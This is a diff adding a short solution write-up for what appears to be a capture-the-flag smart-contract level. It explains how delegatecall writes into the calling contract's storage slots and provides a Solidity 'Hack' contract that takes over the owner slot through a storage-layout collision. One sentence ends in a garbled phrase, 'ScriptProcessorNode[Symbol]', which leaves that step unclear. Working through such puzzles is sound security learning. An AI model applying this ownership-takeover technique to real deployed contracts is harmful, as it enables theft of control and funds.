@@ -1,0 +1,40 @@
+Solution
+
+Videos that help to undestand:
+Delegatecall https://www.youtube.com/watch?v=Yh8UL7FZwAI
+Storage in solidity: https://www.youtube.com/watch?v=Gg6nt3YW74o
+Bits, Bytes and Hex: https://www.youtube.com/watch?v=PmG2qgQbvc8&list=LL&index=2
+
+
+The key here is know that delegate call update variables in the original contract, and the variables have to stay in the same order. 
+In this case we have 4 variables:
+
+address public timeZone1Library; 20 bytes (slot 0)
+address public timeZone2Library; 20 bytes (slot 1)
+address public owner; 20 bytes (slot 2)
+uint storedTime; 32 bytes (slot 3)
+
+
+but in the libraries only have one:
+
+uint storedTime; 32 bytes (slot 0)
+
+So.. when call setFirstTime(_timeStamp) this update the slot 0 of the original contract in the position of the address timeZone1Library.
+This open the posibily of create a script to update the owner and use setFirstTime(_timeStamp) one time to put the script address, and other to use the ScriptProcessorNode[Symbol]
+
+Script that I create for that:
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+contract Hack {
+
+  // stores a timestamp 
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+
+  function setTime(uint _time) public {
+    owner = address(YOURADDRESS); //Other alternative is use msg.sender
+  }
+}
